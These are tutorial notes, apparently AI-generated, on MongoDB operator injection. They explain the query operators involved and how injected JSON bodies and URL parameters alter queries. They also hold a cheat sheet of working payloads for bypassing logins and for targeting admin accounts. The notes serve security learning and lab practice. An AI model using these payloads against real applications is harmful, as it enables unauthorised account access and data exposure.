# NoSQL Injection – Operator Injection

# NoSQL Injection – Operator Injection (MongoDB)

## 1. What is Operator Injection?

**Operator Injection** occurs when an attacker injects **NoSQL query operators** into user input.

Instead of breaking syntax, the attacker **modifies query logic using database operators**.

If the application **directly inserts user input into a database query**, attackers can manipulate the query.

---

# Common MongoDB Query Operators

Some operators frequently used in NoSQL injection attacks:

### `$where`

- Executes a **JavaScript expression**.
- Returns documents where the expression evaluates to **true**.

Example:

```jsx
{ $where: "this.age > 18" }
```

---

### `$ne` (Not Equal)

- Matches all values **not equal** to a specified value.

Example:

```jsx
{ username: { $ne: "admin" } }
```

Returns all users **except admin**.

---

### `$in`

- Matches values that exist in an **array of possible values**.

Example:

```jsx
{ username: { $in: ["admin","administrator"] } }
```

Returns users with those usernames.

---

### `$regex`

- Matches values using **regular expressions**.

Example:

```jsx
{ username: { $regex: "^adm" } }
```

Matches usernames starting with **adm**.

---

# How Operator Injection Works

If an application receives input like:

```json
{"username":"wiener"}
```

And directly inserts it into a MongoDB query:

```jsx
db.users.find({ username: "wiener" })
```

An attacker could inject:

```json
{"username":{"$ne":"invalid"}}
```

Resulting query:

```jsx
db.users.find({ username: { $ne: "invalid" } })
```

This returns **all users except "invalid"**.

---

# Injecting Operators in Requests

## 1. JSON Requests

Operators can be inserted as **nested objects**.

### Original request

```json
{"username":"wiener"}
```

### Injected request

```json
{"username":{"$ne":"invalid"}}
```

---

## 2. URL Parameters

Operators can also be injected in **URL parameters**.

Example:

Original:

```
username=wiener
```

Injected:

```
username[$ne]=invalid
```

---

# If Operator Injection Doesn't Work

Try modifying the request:

- Change **GET → POST**
- Change **Content-Type → application/json**
- Add **JSON body**
- Inject operators inside JSON

Example header:

```
Content-Type: application/json
```

Tools like **Burp Suite Content-Type Converter extension** can help automate this.

---

# Detecting Operator Injection

Test inputs by injecting **different operators** and observing behavior.

Look for:

- Authentication bypass
- Response changes
- Unexpected data returned
- Error messages

---

# Example: Login Request

Application sends:

```json
{"username":"wiener","password":"peter"}
```

Backend query:

```jsx
db.users.find({
 username: "wiener",
 password: "peter"
})
```

---

# Operator Injection Test

Inject `$ne` operator.

### Payload

```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

Query becomes:

```jsx
db.users.find({
 username: { $ne: "invalid" },
 password: "peter"
})
```

Meaning:

- Username **can be any value except "invalid"**

If response changes → **Operator injection possible**.

---

# Authentication Bypass

If both inputs process operators, authentication can be bypassed.

### Payload

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Query becomes:

```jsx
db.users.find({
 username: { $ne: "invalid" },
 password: { $ne: "invalid" }
})
```

Meaning:

- Username ≠ invalid
- Password ≠ invalid

This condition is **true for most records**.

---

### Result

The database returns **the first matching user**.

The attacker is logged in as **that user**.

---

# Targeting Specific Accounts

Attackers can attempt to access **high-privileged accounts**.

Example payload:

```json
{
 "username": { "$in": ["admin","administrator","superadmin"] },
 "password": { "$ne": "" }
}
```

### Meaning

- Username must be **admin / administrator / superadmin**
- Password **must not be empty**

If such an account exists, the attacker **logs in as that user**.

---

# Impact of Operator Injection

Possible impacts include:

- **Authentication bypass**
- **Unauthorized account access**
- **Privilege escalation**
- **Data exposure**
- **Business logic bypass**

In severe cases, attackers may access **admin accounts**.

---

# Quick Testing Payloads (Cheat Sheet)

### Authentication bypass

```json
{"username":{"$ne":null},"password":{"$ne":null}}
```

---

### Admin login attempt

```json
{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}
```

---

### Regex match

```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

---

# Key Takeaways

- Operator injection manipulates **query logic using MongoDB operators**.
- Happens when **user input is directly used in queries without validation**.
- Can lead to:
    - Authentication bypass
    - Account takeover
    - Data exposure

---

If you want, I can also create **a complete NoSQL Injection pentester cheat sheet (syntax + operator + blind techniques)** used in **real bug bounty and HTB machines**, which will make these labs **much easier to solve.**